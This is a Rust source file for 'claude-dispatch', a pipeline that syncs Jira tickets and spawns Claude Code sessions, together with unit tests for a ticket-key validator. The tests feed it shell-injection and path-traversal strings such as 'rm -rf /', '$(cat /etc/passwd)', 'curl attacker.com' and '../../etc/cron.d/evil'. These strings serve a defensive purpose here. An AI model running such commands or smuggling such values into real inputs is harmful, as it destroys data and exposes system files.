mod config;
mod jira;
mod markdown;
mod planner;
mod spawner;
mod state;

use clap::{Parser, Subcommand};
use std::path::PathBuf;
use tracing::{error, info};
use tracing_subscriber::{EnvFilter, fmt, layer::SubscriberExt, util::SubscriberInitExt};

/// Validates that a Jira ticket key matches the expected format (e.g., "PROJ-123").
/// Prevents path traversal and shell injection via crafted ticket keys.
pub fn validate_ticket_key(key: &str) -> bool {
    // Jira keys: 1+ uppercase letters/digits (starting with a letter), hyphen, 1+ digits
    let mut parts = key.splitn(2, '-');
    let project = match parts.next() {
        Some(p) if !p.is_empty() => p,
        _ => return false,
    };
    let number = match parts.next() {
        Some(n) if !n.is_empty() => n,
        _ => return false,
    };
    project.starts_with(|c: char| c.is_ascii_uppercase())
        && project
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
        && number.chars().all(|c| c.is_ascii_digit())
}

#[derive(Parser)]
#[command(name = "claude-dispatch")]
#[command(about = "Automated Jira-to-Claude Code implementation pipeline")]
struct Cli {
    /// Path to config file
    #[arg(long, default_value = "config.toml")]
    config: PathBuf,

    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Internal: mark a ticket as done (called by tmux wrapper)
    MarkDone {
        /// Jira ticket key (e.g., PROJ-123)
        ticket_key: String,
    },
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    // Load config
    let config = match config::Config::load(&cli.config) {
        Ok(cfg) => cfg,
        Err(e) => {
            eprintln!("Failed to load config from {}: {}", cli.config.display(), e);
            std::process::exit(1);
        }
    };

    // Create directories
    let state_dir = config.state_dir();
    let log_dir = config.log_dir();
    let output_dir = config.output_dir();

    for dir in [&state_dir, &log_dir, &output_dir] {
        if let Err(e) = std::fs::create_dir_all(dir) {
            eprintln!("Failed to create directory {}: {}", dir.display(), e);
            std::process::exit(1);
        }
    }

    // Set up tracing with two layers
    let env_filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"));

    let stderr_layer = fmt::layer().with_ansi(true);

    let file_appender = tracing_appender::rolling::daily(&log_dir, "claude-dispatch.log");
    let (non_blocking, _guard) = tracing_appender::non_blocking(file_appender);
    let file_layer = fmt::layer().with_ansi(false).with_writer(non_blocking);

    tracing_subscriber::registry()
        .with(env_filter)
        .with(stderr_layer)
        .with(file_layer)
        .init();

    match cli.command {
        Some(Commands::MarkDone { ticket_key }) => {
            if !validate_ticket_key(&ticket_key) {
                eprintln!("Invalid ticket key format: {}", ticket_key);
                std::process::exit(1);
            }
            handle_mark_done(&config, &ticket_key);
        }
        None => {
            run_pipeline(config).await;
        }
    }
}

fn handle_mark_done(config: &config::Config, ticket_key: &str) {
    let db = match state::StateDb::open(&config.db_path()) {
        Ok(db) => db,
        Err(e) => {
            error!(key = %ticket_key, error = %e, "Failed to open state database");
            std::process::exit(1);
        }
    };

    if let Err(e) = db.mark_done(ticket_key) {
        error!(key = %ticket_key, error = %e, "Failed to mark ticket as done");
        std::process::exit(1);
    }

    info!(key = %ticket_key, "{} session closed, marked as done", ticket_key);

    // Clean up wrapper script
    let script_path = config.state_dir().join(format!("run-{}.sh", ticket_key));
    if script_path.exists()
        && let Err(e) = std::fs::remove_file(&script_path)
    {
        error!(
            key = %ticket_key,
            path = %script_path.display(),
            error = %e,
            "Failed to remove wrapper script"
        );
    }
}

async fn run_pipeline(config: config::Config) {
    info!(
        jira_instance = %config.jira.instance,
        poll_interval_secs = config.jira.poll_interval_secs,
        output_dir = %config.output_dir().display(),
        state_dir = %config.state_dir().display(),
        "Starting claude-dispatch pipeline"
    );

    let sync_config = config.clone();
    let spawner_config = config.clone();

    let sync_handle = tokio::spawn(async move {
        if let Err(e) = jira::run_sync_loop(sync_config).await {
            error!(error = %e, "Jira sync loop exited with error");
        }
    });

    let spawner_handle = tokio::spawn(async move {
        if let Err(e) = spawner::run_spawner_loop(spawner_config).await {
            error!(error = %e, "Spawner loop exited with error");
        }
    });

    tokio::select! {
        _ = sync_handle => {
            error!("Jira sync loop exited unexpectedly");
        }
        _ = spawner_handle => {
            error!("Spawner loop exited unexpectedly");
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- Valid ticket keys ---

    #[test]
    fn test_validate_ticket_key_standard() {
        assert!(validate_ticket_key("PROJ-123"));
        assert!(validate_ticket_key("AB-1"));
        assert!(validate_ticket_key("LONGPROJECT-99999"));
    }

    #[test]
    fn test_validate_ticket_key_with_digits_in_project() {
        // Jira allows digits in the project prefix after the first letter
        assert!(validate_ticket_key("PROJ2-42"));
        assert!(validate_ticket_key("A1B2-1"));
    }

    // --- Shell injection attempts ---

    #[test]
    fn test_reject_shell_injection_semicolon() {
        assert!(!validate_ticket_key("; rm -rf / #"));
    }

    #[test]
    fn test_reject_shell_injection_backtick() {
        assert!(!validate_ticket_key("PROJ-`whoami`"));
    }

    #[test]
    fn test_reject_shell_injection_dollar_paren() {
        assert!(!validate_ticket_key("PROJ-$(cat /etc/passwd)"));
    }

    #[test]
    fn test_reject_shell_injection_pipe() {
        assert!(!validate_ticket_key("PROJ-1|curl attacker.com"));
    }

    #[test]
    fn test_reject_shell_injection_ampersand() {
        assert!(!validate_ticket_key("PROJ-1&& echo pwned"));
    }

    #[test]
    fn test_reject_shell_injection_quoted_breakout() {
        assert!(!validate_ticket_key("PROJ-1\"; rm -rf / \""));
    }

    #[test]
    fn test_reject_shell_injection_newline() {
        assert!(!validate_ticket_key("PROJ-1\nrm -rf /"));
    }

    // --- Path traversal attempts ---

    #[test]
    fn test_reject_path_traversal_dotdot() {
        assert!(!validate_ticket_key("../../etc/passwd"));
    }

    #[test]
    fn test_reject_path_traversal_in_key() {
        assert!(!validate_ticket_key("PROJ-123/../../etc/cron.d/evil"));
    }

    #[test]
    fn test_reject_path_traversal_dotdot_only() {
        assert!(!validate_ticket_key(".."));
    }

    #[test]
    fn test_reject_absolute_path() {
        assert!(!validate_ticket_key("/etc/passwd"));
    }

    // --- Malformed keys ---

    #[test]
    fn test_reject_empty_string() {
        assert!(!validate_ticket_key(""));
    }

    #[test]
    fn test_reject_no_hyphen() {
        assert!(!validate_ticket_key("PROJ123"));
    }

    #[test]
    fn test_reject_no_number() {
        assert!(!validate_ticket_key("PROJ-"));
    }

    #[test]
    fn test_reject_no_project() {
        assert!(!validate_ticket_key("-123"));
    }

    #[test]
    fn test_reject_lowercase_project() {
        assert!(!validate_ticket_key("proj-123"));
    }

    #[test]
    fn test_reject_spaces_in_key() {
        assert!(!validate_ticket_key("PROJ -123"));
    }

    #[test]
    fn test_reject_non_numeric_after_hyphen() {
        assert!(!validate_ticket_key("PROJ-abc"));
    }

    #[test]
    fn test_reject_number_first_in_project() {
        assert!(!validate_ticket_key("1PROJ-42"));
    }

    #[test]
    fn test_reject_special_chars_in_project() {
        assert!(!validate_ticket_key("PR@J-42"));
    }

    #[test]
    fn test_reject_multiple_hyphens() {
        // splitn(2, '-') means "PROJ" and "1-2" — "1-2" is not all digits
        assert!(!validate_ticket_key("PROJ-1-2"));
    }

    // --- Unicode / null byte edge cases ---

    #[test]
    fn test_reject_null_byte() {
        assert!(!validate_ticket_key("PROJ-123\0"));
    }

    #[test]
    fn test_reject_unicode_homoglyph() {
        // Cyrillic "А" looks like Latin "A" but is a different codepoint
        assert!(!validate_ticket_key("РROJ-123")); // Р is Cyrillic
    }
}
